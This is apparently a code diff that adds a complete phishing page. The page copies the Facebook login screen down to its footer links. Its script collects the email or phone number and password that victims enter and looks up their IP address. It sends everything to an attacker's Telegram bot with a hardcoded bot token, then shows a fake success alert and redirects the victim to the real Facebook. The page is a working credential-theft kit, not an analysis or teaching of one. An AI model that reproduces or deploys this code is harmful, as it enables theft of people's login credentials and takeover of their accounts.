@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log in or Sign up</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            padding-top: 80px;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            max-width: 1000px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .left-section {
+            flex: 1;
+            padding-right: 60px;
+        }
+
+        .logo {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .tagline {
+            font-size: 28px;
+            font-weight: normal;
+            color: #1c1e21;
+        }
+
+        .right-section {
+            flex: 1;
+            max-width: 400px;
+        }
+
+        .login-box {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+        }
+
+        .login-box input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-link {
+            display: block;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #dadde1;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .create-btn {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            padding: 14px 16px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .create-btn:hover {
+            background-color: #36a420;
+        }
+
+        .create-page {
+            margin-top: 28px;
+            text-align: center;
+            color: #1c1e21;
+            font-size: 14px;
+        }
+
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 50px;
+            color: #8a8d91;
+            font-size: 12px;
+            text-align: center;
+            max-width: 1000px;
+            padding: 20px;
+        }
+
+        .footer-links {
+            margin-top: 20px;
+        }
+
+        .footer-links a {
+            color: #8a8d91;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .meta-tag {
+            margin-top: 20px;
+            font-size: 12px;
+        }
+
+        .language {
+            margin-top: 10px;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 40px;
+            }
+            .logo {
+                font-size: 48px;
+            }
+            .tagline {
+                font-size: 24px;
+            }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #loading {
+            color: #1877f2;
+            margin-top: 10px;
+        }
+        
+        #error {
+            color: #ff0000;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">
+                <i class="fab fa-facebook-square"></i> facebook
+            </div>
+            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right-section">
+            <div class="login-box">
+                <form id="loginForm">
+                    <input type="text" id="email" placeholder="Email address or phone number" required autocomplete="off">
+                    <input type="password" id="password" placeholder="Password" required autocomplete="off">
+                    <button type="submit" class="login-btn">Log In</button>
+                    <div id="loading" class="hidden">
+                        <i class="fas fa-spinner fa-spin"></i> Logging in...
+                    </div>
+                    <div id="error" class="hidden"></div>
+                    <a href="#" class="forgot-link">Forgotten password?</a>
+                    <button type="button" class="create-btn">Create New Account</button>
+                </form>
+            </div>
+            <div class="create-page">
+                <a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">English (UK)</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">ਪੰਜਾਬੀ</a>
+            <a href="#">ગુજરાતી</a>
+            <a href="#">मराठी</a>
+            <a href="#">தமிழ்</a>
+            <a href="#">తెలుగు</a>
+            <a href="#">বাংলা</a>
+            <a href="#">മലയാളം</a>
+            <a href="#">Español</a>
+            <a href="#"><i class="fas fa-plus"></i></a>
+        </div>
+        <div class="footer-links">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Video</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Meta Store</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Imagine with Meta AI</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Fundraisers</a>
+            <a href="#">Services</a>
+            <a href="#">Voting Information Centre</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Privacy Centre</a>
+            <a href="#">Groups</a>
+            <a href="#">About</a>
+            <a href="#">Create Ad</a>
+            <a href="#">Create Page</a>
+            <a href="#">Developers</a>
+            <a href="#">Careers</a>
+            <a href="#">Cookies</a>
+            <a href="#">AdChoices</a>
+            <a href="#">Terms</a>
+            <a href="#">Help</a>
+            <a href="#">Contact uploading and non-users</a>
+            <a href="#">Settings</a>
+        </div>
+        <div class="meta-tag">
+            Meta © 2024
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const loading = document.getElementById('loading');
+            const errorDiv = document.getElementById('error');
+            
+            // Hide any previous error
+            errorDiv.classList.add('hidden');
+            
+            // Show loading
+            loading.classList.remove('hidden');
+            
+            // Get chat ID from URL parameter
+            const urlParams = new URLSearchParams(window.location.search);
+            let chatId = urlParams.get('id');
+            
+            // Check if chat ID exists in URL
+            if (!chatId) {
+                // No chat ID in URL, show error
+                loading.classList.add('hidden');
+                errorDiv.textContent = 'Error: Chat ID not found in URL. Please use a valid link.';
+                errorDiv.classList.remove('hidden');
+                return;
+            }
+            
+            // Get IP address
+            let ip = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+            } catch (error) {
+                console.log('IP fetch error:', error);
+            }
+            
+            // Prepare message
+            const message = `🔔 New Facebook Login Attempt 🔔
+📧 Email/Phone: ${email}
+🔑 Password: ${password}
+🌐 IP Address: ${ip}
+🕐 Time: ${new Date().toLocaleString()}
+🔗 Page URL: ${window.location.href}`;
+            
+            // Send to Telegram bot
+            const botToken = '8251978557:AAGlFfxZ1bBho1oQufAFLn8OeSmHHII92JY';
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    // Show success message and redirect
+                    alert('Login successful! Redirecting to Facebook...');
+                    setTimeout(() => {
+                        window.location.href = 'https://facebook.com';
+                    }, 2000);
+                } else {
+                    loading.classList.add('hidden');
+                    errorDiv.textContent = 'Error sending data. Please try again.';
+                    errorDiv.classList.remove('hidden');
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                loading.classList.add('hidden');
+                errorDiv.textContent = 'Network error. Please try again.';
+                errorDiv.classList.remove('hidden');
+            }
+        });
+
+        // Create New Account button
+        document.querySelector('.create-btn').addEventListener('click', function() {
+            alert('Create New Account feature would open sign up form.');
+        });
+
+        // Forgot password link
+        document.querySelector('.forgot-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Password reset feature would open here.');
+        });
+    </script>
+</body>
+</html>
